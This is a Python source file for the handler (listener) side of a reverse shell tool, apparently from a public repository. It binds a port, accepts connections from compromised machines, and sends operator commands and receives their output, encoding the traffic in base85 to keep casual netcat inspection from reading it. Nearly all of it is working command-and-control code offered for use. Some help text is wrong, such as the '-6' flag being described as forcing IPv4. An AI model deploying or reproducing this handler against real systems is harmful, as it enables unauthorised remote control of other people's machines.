"""
Handler for the reverse shell, You may not be able to
communicate with help of netcat unless you can decode base85 on your brain ;)
"""
import argparse
import sys
import socket
import base64
import threading
import time

__title__ = "handler"
__description__ = "Handler for reverse_shell"
__license__ = "Apache 2.0"
__version__ = "1.0.0"
__author__ = "000Zer000"
__email__ = "000Zer000@protonmail.com"


class Handler:
    def __init__(self, args):
        self.sock = None
        self.sock_type = socket.SOCK_STREAM
        self.sock_family = socket.AF_INET
        self.parser = self.get_parser()
        print("Reverse Shell handler v{}, Written by 000Zer000".format(__version__))
        print("See the original repo (https://github.com/000Zer000/Python-Reverse-Shell) for updates and more info")
        self.namespace = self.parser.parse_args(args)
        self.port, self.is_ipv6 = self.namespace.port, self.namespace.ipv6
        self.is_udp, self.buffer = self.namespace.udp, self.namespace.buffer
        if self.namespace.version:
            return
        self.make_socket()

    def make_socket(self):
        if self.is_ipv6:
            self.sock_family = socket.AF_INET6
        if self.is_udp:
            self.sock_type = socket.SOCK_DGRAM
        self.sock = socket.socket(self.sock_family, self.sock_type)
        print("[  INFO  ] Binding socket on port '{}'".format(self.port))
        self.sock.bind(("", self.port))
        print("[  INFO  ] Listening for connections... (UDP: {}, IPv6: {})".format(self.is_udp, self.is_ipv6))
        self.sock.listen()

    @staticmethod
    def get_parser():
        pa = argparse.ArgumentParser()
        pa.add_argument("-u", "--udp", help="Accept UDP connections", action="store_true")
        pa.add_argument("-t", "--tcp", help="Accept TCP connections", action="store_false", default=False)
        pa.add_argument("-4", help="Force usage of IPv4", dest="ipv4", action="store_false", default=False)
        pa.add_argument("-6", help="Force usage of IPv4", dest="ipv6", action="store_true")
        pa.add_argument("-v", "--version", help="Print version, then exit", action="store_true", default=False)
        pa.add_argument("--buffer", help="Buffer to use for receiving data (defaults to 10240)",
                        action="store", type=int, default=10240, metavar="BUFFER")
        pa.add_argument("-p", "--port", help="The port to listen to", action="store",
                        type=int, default=3333, metavar="PORT")
        pa.add_argument("-x", "--execute", dest="cmd",
                        help="Execute command, show the result, then close the connection",
                        default="",
                        metavar="command")
        return pa

    def _recv(self, conn):
        try:
            while True:
                result = conn.recv(self.buffer)
                print(base64.b85decode(result).decode(errors="ignore"))
        except:
            print("Socket failure: Lost connection")
            self.exit()

    def _one_time(self, conn):
        print("[ REPORT ] Executing '{}'".format(self.namespace.cmd))
        conn.send(self.namespace.cmd.encode())
        time.sleep(2)
        self.exit()

    def _main_loop(self, conn, addr):
        threading.Thread(target=self._recv, args=(conn, )).start()
        while True:
            try:
                # This sleep makes sure the thread doesn't ruin the interface
                time.sleep(1.5)
                cmd = input("{}: ".format(addr[0])).strip()
            except EOFError:
                print("[CRITICAL] Exiting shell and shutting down connection")
                return
            if cmd:
                conn.send(base64.b85encode(cmd.encode()))

    def loop(self):
        while True:
            conn, addr = self.sock.accept()
            print("[ REPORT ] Got connection from '{}'".format(addr[0]))
            try:
                if self.namespace.cmd:
                    self._one_time(conn)
                self._main_loop(conn, addr)
            except socket.error as e:
                print("Socket failure: {}".format(e))
            except BaseException:
                print("Unexpected Exception: Please report this to 000Zer000 on github")
                raise
            finally:
                self.exit()

    def exit(self, sock=None):
        print("Shutting down connections and exiting shell...")
        try:
            self.sock.close()
            sock.close()
        except:
            pass
        raise SystemExit


if __name__ == '__main__':
    handler = Handler(sys.argv[1:])
    handler.loop()
